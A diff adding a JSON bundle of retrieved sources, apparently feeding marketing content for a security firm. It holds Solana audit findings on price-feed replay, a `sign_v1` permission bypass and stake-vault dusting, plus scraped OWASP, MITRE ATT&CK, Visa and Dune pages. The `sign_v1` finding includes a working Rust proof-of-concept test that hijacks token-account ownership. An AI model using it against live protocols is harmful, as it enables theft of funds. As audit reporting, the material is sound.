@@ -1,0 +1,210 @@
+{
+  "thread_1": {
+    "slot_id": "thread_1",
+    "topic_id": "SS-03738",
+    "topic_name": "Non-Canonical Price Feeds Allow Historical Price Manipulation",
+    "sources": [
+      {
+        "source_id": "SS-03738",
+        "kind": "kb",
+        "url": null,
+        "title": "Non-Canonical Price Feeds Allow Historical Price Manipulation",
+        "retrieved_at": "2026-10-24T13:40:32.247673Z",
+        "published_at": null,
+        "evidence_text": "Non-Canonical Price Feeds Allow Historical Price Manipulation\nWe found that the protocol does **not enforce canonical accounts** for `sol_usd_pyth_feed` . Any account with the same `feed ID` can be submitted, allowing anyone to create a `PriceUpdateV2` account and publish historical prices. For example, with a 5-minute age window:\n\n- Transaction 1 uses price `t2` (latest).\n\n- Transaction 2 uses price `t1` (older, t1 < t2) from a custom account.\n\nWhile the protocol correctly validates publish and update times, this issue allows users to submit historical valid prices within the allowed time window (which was configured to be 60s), potentially manipulating outcomes.\n- Use a **canonical feed account** managed and sponsored by Pyth.\n\n- Alternatively, use a **personal, persistent account** that you control and update yourself.",
+        "status": "ok"
+      }
+    ],
+    "kb_allowed": false
+  },
+  "thread_2": {
+    "slot_id": "thread_2",
+    "topic_id": "SS-03699",
+    "topic_name": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions",
+    "sources": [
+      {
+        "source_id": "SS-03699",
+        "kind": "kb",
+        "url": null,
+        "title": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions",
+        "retrieved_at": "2026-10-24T13:40:41.338842Z",
+        "published_at": null,
+        "evidence_text": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions\nWe found that the `sign_v1` instruction does not restrict which instructions can be executed against accounts. This means that a user with limited permissions—such as a `TokenLimit` on a specific mint—can submit malicious instructions that interact with all accounts in ways not covered by their role.\n\n**Example Attack:**\n\nA user with `TokenLimit` permission on mint `[0; 32]` and amount `1` can submit a `SetAuthority` instruction on the token account. Since this operation does not change the token balance, the permission system passes, yet the attacker gains ownership of the token account. Or even the user with no Permission at all could do this because the function only checks for permission if the balance changed.\n\nThis vulnerability extends beyond token accounts. Similar unauthorised actions could be executed on:\n\n• Stake accounts (e.g., transferring authority, modifying lockups) • Any account where the action doesn't affect the balance but modifies control or behaviour.\n\n**POC Summary**\n\nIn this poc, second_authority has TokenLimit permission for token [0;32] and amount 1, but it transfers the token account authority to itself.\n\n```\n#[test_log::test]\nfn test_transfer_tokens_with_mixed_permissions() {\n    let mut context = setup_test_context().unwrap();\n    let protocol_authority = Keypair::new();\n    context\n        .svm\n        .airdrop(&protocol_authority.pubkey(), 10_000_000_000)\n        .unwrap();\n    let id = rand::random::<[u8; 32]>();\n    let the protocol = Pubkey::find_program_address(&protocol_account_seeds(&id), &program_id()).0;\n    context.svm.warp_to_slot(10);\n    // Setup token infrastructure\n    let mint_pubkey = setup_mint(&mut context.svm, &context.default_payer).unwrap();\n    let protocol_ata = setup_ata(\n        &mut context.svm,\n        &mint_pubkey,\n        &the protocol,\n        &context.default_payer,\n    )\n    .unwrap();\n    mint_to(\n        &mut context.svm,\n        &mint_pubkey,\n        &context.default_payer,\n        &protocol_ata,\n        1000,\n    )\n    .unwrap();\n    let protocol_create_txn = create_protocol_ed25519(&mut context, &protocol_authority, id);\n    assert!(protocol_create_txn.is_ok());\nlet second_authority = Keypair::new();\ncontext\n    .svm\n    .airdrop(&second_authority.pubkey(), 10_000_000_000)\n    .unwrap();\nadd_authority_with_ed25519_root(\n    &mut context,\n    &the protocol,\n    &protocol_authority,\n    AuthorityConfig {\n        authority_type: AuthorityType::Ed25519,\n        authority: second_authority.pubkey().as_ref(),\n    },\n    vec![ClientAction::TokenLimit(TokenLimit {\n        token_mint: [0; 32],\n        current_amount: 1,\n    })],\n)\n.unwrap();\ncontext.svm.warp_to_slot(100);\nlet token_ix = Instruction {\n    program_id: spl_token::id(),\n    accounts: vec![\n        AccountMeta::new(protocol_ata, false),\n        AccountMeta::new(the protocol, false),\n    ],\n    data: TokenInstruction::SetAuthority {\n        authority_type: spl_token::instruction::AuthorityType::AccountOwner,\n        new_authority: Some(second_authority.pubkey()).into(),\n    }\n    .pack(),\n};\nlet account = context.svm.get_account(&protocol_ata).unwrap();\nlet token_account = spl_token::state::Account::unpack(&account.data).unwrap();\nprintln!(\"pk: {} account: {:?}\", protocol_ata, token_account);\nlet sign_ix = protocol_interface::SignInstruction::new_ed25519(\n    the protocol,\n    second_authority.pubkey(),\n    second_authority.pubkey(),\n    token_ix,\n    1,\n)\n.unwrap();\nlet transfer_message = v0::Message::try_compile(\n    &second_authority.pubkey(),\n    &[sign_ix],\n    &[],\n    context.svm.latest_blockhash(),\n)\n.unwrap();\nlet transfer_tx =\n    VersionedTransaction::try_new(VersionedMessage::V0(transfer_message), &[&second_authority])\n        .unwrap();\nlet res = context.svm.send_transaction(transfer_tx);\nif res.is_err() {\n    let e = res.unwrap_err();\n    println!(\"Logs {} - {:?}\", e.err, e.meta.logs);\n}\n// assert!(res.is_ok());\nlet protocol_token_account = context.svm.get_account(&protocol_ata).unwrap();\nlet protocol_token_balance = spl_token::state::Account::unpack(&protocol_token_account.data).unwrap();\nlet protocol_token_account_owner = protocol_token_balance.owner;\nassert_eq!(protocol_token_account_owner, second_authority.pubkey());\n```\n\n`assert_eq!(protocol_token_balance.amount, 1000); }` Logs:\n\n```\n       START             the protocol::sign test_transfer_tokens_with_mixed_permissions\nrunning 1 test\nprogram_id: <program id>\nprogram_id 2: <program id>\npk: <program id> account: Account { mint: <program id>\nDW2eG7hj1uBS, owner: <program id>, amount: 1000, delegate: None, state: In\nitialized, is_native: None, delegated_amount: 0, close_authority: None }\ntest test_transfer_tokens_with_mixed_permissions ... ok\ntest result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out; finished in 0.31s\nPASS [   0.317s] the protocol::sign test_transfer_tokens_with_mixed_permissions\n```\nRestrict instruction types and actions per account type. Only allow explicitly approved and verifiable operations based on the assigned role. For example:\n\n• For token accounts: only allow `Transfer` , `Burn` (with limits), etc. ...",
+        "status": "ok"
+      }
+    ],
+    "kb_allowed": false
+  },
+  "thread_3": {
+    "slot_id": "thread_3",
+    "topic_id": "SS-03897",
+    "topic_name": "Anyone can dust a stake vault and permanently block unstaking",
+    "sources": [
+      {
+        "source_id": "SS-03897",
+        "kind": "kb",
+        "url": null,
+        "title": "Anyone can dust a stake vault and permanently block unstaking",
+        "retrieved_at": "2026-10-24T13:40:41.377619Z",
+        "published_at": null,
+        "evidence_text": "Anyone can dust a stake vault and permanently block unstaking\n`unstake` transfers only the principal recorded in `StakeAccount` and then unconditionally closes the vault, even though the vault can receive unsolicited token transfers. Any holder of the pool mint can send one base unit to a victim’s publicly derivable vault; the resulting nonzero remainder makes `CloseAccount` fail and atomically rolls back every withdrawal attempt, while no instruction can sweep the excess.\nIn step 1, transfer the full token account balance to the staker, instead of the recorded balance.",
+        "status": "ok"
+      }
+    ],
+    "kb_allowed": false
+  },
+  "marketing_1": {
+    "slot_id": "marketing_1",
+    "topic_id": "ANGLE-agentic-security",
+    "topic_name": "agentic-security-and-red-teaming",
+    "sources": [
+      {
+        "source_id": "WEB-cecce92d753337bd",
+        "kind": "web",
+        "url": "https://genai.owasp.org/llmrisk/llm062025-excessive-agency",
+        "title": "LLM06:2025 Excessive Agency - OWASP Gen AI Security Project",
+        "retrieved_at": "2026-10-24T13:40:58.267419Z",
+        "published_at": null,
+        "evidence_text": " [Skip to content](#content \"Skip to content\")\n\n# [Join us in Orlando, FL 10/11 – 10/15 @ InfoSec World 2026](https://genai.owasp.org/event/infosecworld/)\n\n[Register Now!](https://genai.owasp.org/event/infosecworld/)\n\n* [GETTING STARTED](#)\n  + [Introduction](https://genai.owasp.org/introduction-genai-security-project/)\n  + [MEETINGS](https://genai.owasp.org/meetings/)\n  + [CONTRIBUTING](https://genai.owasp.org/contributing/)\n  + [EVENTS](/events/)\n  + [GLOSSARY](https://genai.owasp.org/glossary/)\n* [RESOURCES](https://genai.owasp.org/resources/)\n  + [All](/resources/)\n  + [LLM TOP 10](https://genai.owasp.org/llm-top-10/)\n    - [LLM TOP 10 FOR 2025](https://genai.owasp.org/llm-top-10/)\n    - [LLM TOP 10 FOR 2023/24](https://genai.owasp.org/llm-top-10-2023-24/)\n  + [CHEAT SHEETS](https://genai.owasp.org/resources/?e-filter-3b7adda-resource-item=cheat-sheets)\n  + [WHITEPAPERS](https://genai.owasp.org/resources/?e-filter-3b7adda-resource-item=whitepaper)\n  + [TOOLS](https://genai.owasp.org/resources/?e-filter-3b7adda-resource-item=tools)\n  + [LEARNING VIDEOS](/learning/)\n  + [SOLUTIONS DIRECTORY](/ai-security-solutions-landscape/)\n  + [ROADMAP](https://genai.owasp.org/roadmap/)\n  + [NEWSLETTER](https://genai.owasp.org/newsletter/)\n* [PROJECT INITIATIVES](https://genai.owasp.org/initiatives/)\n  + [Top 10 for LLM and GenAI](https://genai.owasp.org/initiatives/top-10-for-llm-and-genai/)\n  + [AGENTIC SECURITY](https://genai.owasp.org/initiatives/agentic-security-initiative/)\n  + [AI Bill of Materials](https://genai.owasp.org/initiatives/ai-sbom-initiative/)\n  + [Ai Data Security](/initiatives/ai-data-security-initiative/)\n  + [AI Security Governance](https://genai.owasp.org/initiatives/ai-security-governance-and-adoption/)\n  + [AI Security Solutions](https://genai.owasp.org/initiatives/ai-security-solutions/)\n  + [AI Threat Intel & Resp](/initiatives/ai-threat-intelligence/)\n  + [AI Red Teaming](/initiatives/ai-red-teaming/)\n* [BLOG](https://genai.owasp.org/blog/)\n* [ABOUT](#)\n  + [Mission and Charter](https://genai.owasp.org/project-mission-and-charter/)\n  + [Governance](https://genai.owasp.org/project-governance/)\n  + [LEADERSHIP](/contributors/)\n  + [INDUSTRY RECOGNITION](https://genai.owasp.org/quotes/)\n  + [CONTRIBUTORS](/contributors/#allcontributors)\n  + [SPONSORS](/supporters/)\n  + [SUPPORTERS](/supporters/)\n  + [SPONSORSHIP](https://genai.owasp.org/sponsorship/)\n  + [NEWSROOM](https://genai.owasp.org/news/)\n  + [CONTACT](https://genai.owasp.org/contact/)\n  + [BRANDING](https://genai.owasp.org/branding/)\n\n![](https://genai.owasp.org/wp-content/uploads/2024/04/Slide06.png)\n\n## LLM06:2025 Excessive Agency\n\nAn LLM-based system is often granted a degree of agency by its developer – the ability to call functions or interface with other systems via extensions (sometimes referred to as tools, skills or plugins by different vendors) to undertake actions in response to a prompt. The decision over which extension to invoke may also be delegated to an LLM ",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-742d684f9b9a8133",
+        "kind": "web",
+        "url": "https://genai.owasp.org/llmrisk/llm01-prompt-injection",
+        "title": "LLM01:2025 Prompt Injection - OWASP Gen AI Security Project",
+        "retrieved_at": "2026-10-24T13:40:58.267502Z",
+        "published_at": null,
+        "evidence_text": " [Skip to content](#content \"Skip to content\")\n\n# [Join us in Orlando, FL 10/11 – 10/15 @ InfoSec World 2026](https://genai.owasp.org/event/infosecworld/)\n\n[Register Now!](https://genai.owasp.org/event/infosecworld/)\n\n* [GETTING STARTED](#)\n  + [Introduction](https://genai.owasp.org/introduction-genai-security-project/)\n  + [MEETINGS](https://genai.owasp.org/meetings/)\n  + [CONTRIBUTING](https://genai.owasp.org/contributing/)\n  + [EVENTS](/events/)\n  + [GLOSSARY](https://genai.owasp.org/glossary/)\n* [RESOURCES](https://genai.owasp.org/resources/)\n  + [All](/resources/)\n  + [LLM TOP 10](https://genai.owasp.org/llm-top-10/)\n    - [LLM TOP 10 FOR 2025](https://genai.owasp.org/llm-top-10/)\n    - [LLM TOP 10 FOR 2023/24](https://genai.owasp.org/llm-top-10-2023-24/)\n  + [CHEAT SHEETS](https://genai.owasp.org/resources/?e-filter-3b7adda-resource-item=cheat-sheets)\n  + [WHITEPAPERS](https://genai.owasp.org/resources/?e-filter-3b7adda-resource-item=whitepaper)\n  + [TOOLS](https://genai.owasp.org/resources/?e-filter-3b7adda-resource-item=tools)\n  + [LEARNING VIDEOS](/learning/)\n  + [SOLUTIONS DIRECTORY](/ai-security-solutions-landscape/)\n  + [ROADMAP](https://genai.owasp.org/roadmap/)\n  + [NEWSLETTER](https://genai.owasp.org/newsletter/)\n* [PROJECT INITIATIVES](https://genai.owasp.org/initiatives/)\n  + [Top 10 for LLM and GenAI](https://genai.owasp.org/initiatives/top-10-for-llm-and-genai/)\n  + [AGENTIC SECURITY](https://genai.owasp.org/initiatives/agentic-security-initiative/)\n  + [AI Bill of Materials](https://genai.owasp.org/initiatives/ai-sbom-initiative/)\n  + [Ai Data Security](/initiatives/ai-data-security-initiative/)\n  + [AI Security Governance](https://genai.owasp.org/initiatives/ai-security-governance-and-adoption/)\n  + [AI Security Solutions](https://genai.owasp.org/initiatives/ai-security-solutions/)\n  + [AI Threat Intel & Resp](/initiatives/ai-threat-intelligence/)\n  + [AI Red Teaming](/initiatives/ai-red-teaming/)\n* [BLOG](https://genai.owasp.org/blog/)\n* [ABOUT](#)\n  + [Mission and Charter](https://genai.owasp.org/project-mission-and-charter/)\n  + [Governance](https://genai.owasp.org/project-governance/)\n  + [LEADERSHIP](/contributors/)\n  + [INDUSTRY RECOGNITION](https://genai.owasp.org/quotes/)\n  + [CONTRIBUTORS](/contributors/#allcontributors)\n  + [SPONSORS](/supporters/)\n  + [SUPPORTERS](/supporters/)\n  + [SPONSORSHIP](https://genai.owasp.org/sponsorship/)\n  + [NEWSROOM](https://genai.owasp.org/news/)\n  + [CONTACT](https://genai.owasp.org/contact/)\n  + [BRANDING](https://genai.owasp.org/branding/)\n\n![](https://genai.owasp.org/wp-content/uploads/2024/04/LLM01.25.png)\n\n## LLM01:2025 Prompt Injection\n\nA Prompt Injection Vulnerability occurs when user prompts alter the LLM’s behavior or output in unintended ways. These inputs can affect the model even if they are imperceptible to humans, therefore prompt injections do not need to be human-visible/readable, as long as the content is parsed by the model.\n\nPrompt Injection vulnerabilities exist ",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-9c82219263d643ce",
+        "kind": "web",
+        "url": "https://github.com/UnitOneAI/SecuritySkills/blob/main/skills/ai-security/agentic-top-10/SKILL.md",
+        "title": "SecuritySkills/skills/ai-security/agentic-top-10/SKILL.md at main · UnitOneAI/SecuritySkills · GitHub",
+        "retrieved_at": "2026-10-24T13:40:58.267350Z",
+        "published_at": null,
+        "evidence_text": "[Skip to content](#start-of-content)   \n \n \n\n## Navigation Menu\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FUnitOneAI%2FSecuritySkills%2Fblob%2Fmain%2Fskills%2Fai-security%2Fagentic-top-10%2FSKILL.md)\n\nAppearance settings\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FUnitOneAI%2FSecuritySkills%2Fblob%2Fmain%2Fskills%2Fai-security%2Fagentic-top-10%2FSKILL.md)\n\n[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=UnitOneAI%2FSecuritySkills)\n\nAppearance settings\n\nYou signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert\n\n{{ message }}\n\n## Repository navigation\n\n \n\n## Expand file tree\n\n/\n\n# SKILL.md\n\nCopy path\n\nMore file actions\n\nMore file actions\n\n## Latest commit\n\n## History\n\n[History](/UnitOneAI/SecuritySkills/commits/main/skills/ai-security/agentic-top-10/SKILL.md)\n\nHistory\n\n629 lines (429 loc) · 41.4 KB\n\n/\n\n# SKILL.md\n\nCopy path\n\n## File metadata and controls\n\n629 lines (429 loc) · 41.4 KB\n\n[Raw](https://github.com/UnitOneAI/SecuritySkills/raw/refs/heads/main/skills/ai-security/agentic-top-10/SKILL.md)\n\nCopy raw file\n\nDownload raw file\n\nOutline\n\nEdit and raw actions\n\n|  |  |\n| --- | --- |\n| name | agentic-top-10 |\n| description | Reviews agentic AI systems against the OWASP Top 10 security risks for autonomous AI agents. Auto-invoked when reviewing multi-agent architectures, AI agent deployments, or systems where LLMs have tool access and act autonomously. Covers permission models, tool security, memory integrity, trust boundaries, and human oversight. Produces a structured assessment with risk ratings and architectural recommendations. |\n| tags | |  |  |  | | --- | --- | --- | | ai-security | agentic-ai | agents | |\n| role | |  |  |  |  | | --- | --- | --- | --- | | appsec-engineer | security-engineer | architect | vciso | |\n| phase | |  |  |  | | --- | --- | --- | | design | build | review | |\n| frameworks | |  |  |  | | --- | --- | --- | | OWASP-Agentic-AI | MITRE-ATLAS | NIST-AI-RMF | |\n| difficulty | advanced |\n| time\\_estimate | 45-90min |\n| version | 1.0.1 |\n| author | unitoneai |\n| license | MIT |\n| allowed-tools | Read, Grep, Glob |\n| context | fork |\n| injection-hardened | true |\n| argument-hint | [target-file-or-directory] |\n\n# OWASP Top 10 for Agentic AI Applications — Security Review Skill\n\n## Purpose\n\nThis skill provides a structured security assessment methodology for agentic AI systems — applications where one or more LLM-powered agents operate autonomously, invoke tools, maintain persistent memory, and collaborate with other agents or humans. It is organized around the ten threat categories identified through the OWASP GenAI Security Project's research into agentic AI risks.\n\nThis is not a theoretical exercise. Agentic AI systems are",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-03",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-24T13:40:59.842317Z",
+        "published_at": null,
+        "evidence_text": "SanadSquad provides agentic security and red teaming for AI agent systems, including prompt injection, tool abuse, unauthorized action, agent wallets, and spending policy.",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-05",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-24T13:40:59.842326Z",
+        "published_at": null,
+        "evidence_text": "Teams can request a review.",
+        "status": "ok"
+      }
+    ],
+    "kb_allowed": false
+  },
+  "marketing_2": {
+    "slot_id": "marketing_2",
+    "topic_id": "ANGLE-pentesting",
+    "topic_name": "web2-pentesting",
+    "sources": [
+      {
+        "source_id": "WEB-62ec284658feb605",
+        "kind": "web",
+        "url": "https://attack.mitre.org/techniques/T1195",
+        "title": "Supply Chain Compromise, Technique T1195 - Enterprise | MITRE ATT&CK®",
+        "retrieved_at": "2026-10-24T13:40:44.683462Z",
+        "published_at": null,
+        "evidence_text": "ATT&CKcon 7.0 registration is open! Join us October 27-28, 2026 in McLean, VA or virtually. [Register in person](https://na.eventscloud.com/website/93925/) or [register virtually](https://mitre.brandlive.com/MITRE-ATTACKcon-7-0). See the [FAQ](https://na.eventscloud.com/website/93925/faq/) for hotel and venue details.\n\n1. [Home](/)\n2. [Techniques](/techniques/enterprise)\n3. [Enterprise](/techniques/enterprise)\n4. Supply Chain Compromise\n\n# Supply Chain Compromise\n\n##### Sub-techniques (3)\n\n| ID | Name |\n| --- | --- |\n| [T1195.001](/techniques/T1195/001/) | [Compromise Software Dependencies and Development Tools](/techniques/T1195/001/) |\n| [T1195.002](/techniques/T1195/002/) | [Compromise Software Supply Chain](/techniques/T1195/002/) |\n| [T1195.003](/techniques/T1195/003/) | [Compromise Hardware Supply Chain](/techniques/T1195/003/) |\n\nAdversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (removable media infected at the factory)[[1]](https://www-01.ibm.com/support/docview.wss?uid=ssg1S1010146&myns=s028&mynp=OCSTHGUJ&mynp=OCSTLM5A&mynp=OCSTLM6B&mynp=OCHW206&mync=E&cm_sp=s028-_-OCSTHGUJ-OCSTLM5A-OCSTLM6B-OCHW206-_-E)[[2]](https://www.se.com/us/en/download/document/SESN-2018-236-01/)\n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.[[3]](https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities)[[4]](https://cloudblogs.microsoft.com/microsoftsecure/2018/03/07/behavior-monitoring-combined-with-machine-learning-spoils-a-massive-dofoil-coin-mining-campaign/)[[5]](https://web.archive.org/web/20160309235002/https://www.commandfive.com/papers/C5_APT_SKHack.pdf) Adversaries may limit targeting to a desired victim set or distribute malicious software to a broad set of consumers but only follow up with specific victims.[[6]](https://web.archive.org/web/20190717233006/http:/www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-elderwood-project.pdf)[[3]](https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities)[[5]](https://web.archive.org/web/20160309235002/https://www.commandfive.com/papers/C5_APT_SKHac",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-436d44973f602353",
+        "kind": "web",
+        "url": "https://attack.mitre.org/techniques/T1195/002",
+        "title": "Supply Chain Compromise: Compromise Software Supply Chain, Sub-technique T1195.002 - Enterprise | MITRE ATT&CK®",
+        "retrieved_at": "2026-10-24T13:40:44.683351Z",
+        "published_at": null,
+        "evidence_text": "ATT&CK v20 has been released! Check out the [blog post](https://medium.com/mitre-attack/attack-v20-9701dd75ffb4) for more information. [ATT&CKcon 7.0](https://na.eventscloud.com/website/93925/) is October 27-28, 2026 in McLean, VA.\n\n1. [Home](/)\n2. [Techniques](/techniques/enterprise)\n3. [Enterprise](/techniques/enterprise)\n4. [Supply Chain Compromise](/techniques/T1195)\n5. Compromise Software Supply Chain\n\n# Supply Chain Compromise: Compromise Software Supply Chain\n\n##### Other sub-techniques of Supply Chain Compromise (3)\n\n| ID | Name |\n| --- | --- |\n| [T1195.001](/techniques/T1195/001/) | [Compromise Software Dependencies and Development Tools](/techniques/T1195/001/) |\n| T1195.002 | Compromise Software Supply Chain |\n| [T1195.003](/techniques/T1195/003/) | [Compromise Hardware Supply Chain](/techniques/T1195/003/) |\n\nAdversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.[[1]](https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities)[[2]](https://web.archive.org/web/20160309235002/https://www.commandfive.com/papers/C5_APT_SKHack.pdf)\n\nID: T1195.002\n\nSub-technique of:  [T1195](/techniques/T1195)\n\nⓘ\n\nTactic: [Initial Access](/tactics/TA0001)\n\nⓘ\n\nPlatforms: Linux, Windows, macOS\n\nVersion: 1.1\n\nCreated: 11 March 2020\n\nLast Modified: 24 October 2025\n\n[Version Permalink](/versions/v20/techniques/T1195/002/ \"Permalink to this version of T1195.002\")\n\n[Live Version](/versions/v20/techniques/T1195/002/ \"Go to the live version of T1195.002\")\n\n## Procedure Examples\n\n| ID | Name | Description |\n| --- | --- | --- |\n| [C0057](/campaigns/C0057) | [3CX Supply Chain Attack](/campaigns/C0057) | During the [3CX Supply Chain Attack](/campaigns/C0057), [AppleJeus](/groups/G1049) first compromised an \"end-of-life\" trading software application which was downloaded and executed inside the 3CX enterprise environment. The second compromise modified the Windows and macOS build environments used to distribute the 3CX software to their customer base.[[3]](https://cloud.google.com/blog/topics/threat-intelligence/3cx-software-supply-chain-compromise/) |\n| [G0096](/groups/G0096) | [APT41](/groups/G0096) | [APT41](/groups/G0096) gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users.[[4]](https://www.mandiant.com/sites/default/files/2022-02/rt-apt41-dual-operation.pdf) |\n| [S0222](/software/S0222) | [CCBkdr](/software/S0222) | [CCBkdr](/",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-02",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-24T13:40:46.488653Z",
+        "published_at": null,
+        "evidence_text": "SanadSquad provides Web2 pentesting for the infrastructure around a protocol: APIs, cloud, CI/CD, dependencies, internal access, and frontend.",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-05",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-24T13:40:46.488666Z",
+        "published_at": null,
+        "evidence_text": "Teams can request a review.",
+        "status": "ok"
+      }
+    ],
+    "kb_allowed": false
+  },
+  "marketing_3": {
+    "slot_id": "marketing_3",
+    "topic_id": "ANGLE-agentic-payments",
+    "topic_name": "agentic-payments-x402-vs-mpp",
+    "sources": [
+      {
+        "source_id": "WEB-6336a84ca33f90b3",
+        "kind": "web",
+        "url": "https://www.visa.com/vcom-assets/content/dam/visa/reimagine-visa/thought-leadership/documents/agentic-payments-report.pdf",
+        "title": "Visa: Agentic Payments from the Ground Up",
+        "retrieved_at": "2026-10-24T13:40:45.104908Z",
+        "published_at": null,
+        "evidence_text": "July 2026 TRANSACTION SHAPE & NEW ARCHITECTURE REQUIREMENTS JULY 2026 JULY 2026 1.1 Defining Agentic Commerce Agentic commerce is a new economic surface where software autonomously discovers, evaluates, and executes transactions \u0013 continuously, programmatically, and across a far wider range of commerce than traditional payment infrastructure was designed to handle. The degree of autonomy varies. Some workflows keep a human in the loop to review or approve purchases, while others run fully autonomously once configured. Agents can buy SaaS licenses, book travel, automate accounts payable, reorder physical inventory, and commission creative work, often without human intervention at the moment of purchase. Within that broader landscape, a new sub-category of machine-native, sub-dollar transactions is also emerging: an AI agent calls an API, receives an HTTP 402 response (\u001cPayment Required\u001d), evaluates the price, pays, and consumes the resource. That cycle takes milliseconds and requires no checkout page, saved card, or browsing session \u0013 only a wallet or card, a budget, and an objective. For payment providers, the full spectrum of agentic commerce creates new transaction surfaces with different economics, risk controls, and infrastructure requirements from traditional e-commerce.\nAI crosses the line from chatbot to agent when it begins to reason through multi-step tasks, call external tools, evaluate results, and iterate on its approach autonomously. Agents built on frontier models like Claude, GPT, and Gemini are now deployed in production across every business vertical. Over the past year, these agents have become very capable at writing code and conducting research, but they are inherently limited by access.\nGiving agents the ability to pay removes that constraint: An IT agent purchases fifty additional seats on a SaaS platform after headcount changes.\nAn administrative agent reorders printer toner and breakroom supplies when inventory runs low.\nA research agent queries five financial data providers a few cents each for the same company’s filings, then picks the most complete dataset.\nA marketing agent pays ten image-generation providers 5 cents each to render the same product shot, then selects the best output.\nAgentic payments span two distinct transaction categories. The first is macro, where an agent executes high-value, consumer-like purchases on behalf of a human (e.g., booking travel, managing subscriptions, ordering supplies). These transactions resemble traditional e-commerce, with the agent acting as a proxy for human intent. The second category is micro, characterized by high-frequency, low-value purchases (i.e., API calls, data queries, compute access, tool usage) initiated by the agent. Both categories are real and growing, but micro-transactions are the area where new payment architecture is most needed, and where new protocols are emerging to fill the gap.\nTwo open-source payment protocols have gone live in the past twelve months to",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-2869b4da65b9ba10",
+        "kind": "web",
+        "url": "https://docs.dune.com/data-catalog/curated/payments/agentic-payments",
+        "title": "Agentic Payments - Dune Docs",
+        "retrieved_at": "2026-10-24T13:40:45.105142Z",
+        "published_at": null,
+        "evidence_text": "> ## Documentation Index\n>\n> Fetch the complete documentation index at:</llms.txt>\n>\n> Use this file to discover all available pages before exploring further.\n\n[Dune Docs home page![light logo](https://mintcdn.com/dune/zh-3B8LgVmyrKOaG/logo/dune-logo-light.svg?fit=max&auto=format&n=zh-3B8LgVmyrKOaG&q=85&s=6fec71d5070d0923eb2924321131b1c2)![dark logo](https://mintcdn.com/dune/zh-3B8LgVmyrKOaG/logo/dune-logo-dark.svg?fit=max&auto=format&n=zh-3B8LgVmyrKOaG&q=85&s=2501750983cc95aa72d40acc6f005bd9)](https://docs.dune.com/)\n\n[Docs](/)[Data Catalog](/data-catalog/overview)[API Reference](/api-reference/overview/introduction)[SQL Query Engine](/query-engine/overview)[Resources](/resources/credits-billing/overview)\n\nPayments\n\n# Agentic Payments\n\nMachine-to-machine onchain payment activity across open HTTP 402 payment standards — x402 and MPP (onchain Tempo rails only).\n\nThe `payments.agentic_payments` table captures machine-to-machine onchain payment activity settled through open payment standards built on HTTP 402. The dataset covers two protocols:\n\n* **x402** — an onchain-native payment standard. Payment settlement is fully trackable onchain via facilitator infrastructure.\n* **MPP (Machine Payments Protocol)** — supports both onchain and offchain payment methods; this dataset tracks only its onchain Tempo rails: Tempo Charge (one-time onchain payments) and Tempo Session (onchain escrow and settlement, with offchain usage metering between onchain events).\n\nEach row represents one onchain payment settlement — order creation, authorization, and intermediate protocol events that do not themselves settle onchain are excluded. Agentic payments feed into `payments.commerce_flows` as a Tier A (label-based) source, classified as `party_pair = b2b`, `purpose = commerce`, `confidence = high`.\n\n## Why this dataset matters\n\nAgentic payments let AI agents and automated services pay each other onchain without human involvement. Tracking them separately makes it possible to:\n\n* Measure the scale and growth of machine-to-machine payment activity.\n* Attribute stablecoin transfers to specific agentic protocols (x402, MPP).\n* Compare protocol adoption across chains and over time.\n\n## [​](#coverage) Coverage\n\n**Protocols:** x402, MPP (onchain Tempo rails only). **Chains:** Base, Polygon, and Solana (x402); Tempo (MPP). **Tokens:** Not restricted to stablecoins — x402 rows can include EIP-3009 tokens (e.g. USDC, EURC), other ERC-20 tokens, and classic SPL token transfers on Solana. `settlement_pattern` is currently enriched only for decoded USDC EIP-3009 transfers on EVM; Permit2 and Solana settlement decoding are future phases. Native SOL and Token-2022 are not covered yet (excluded follow-ups). **x402 facilitators** are tracked via 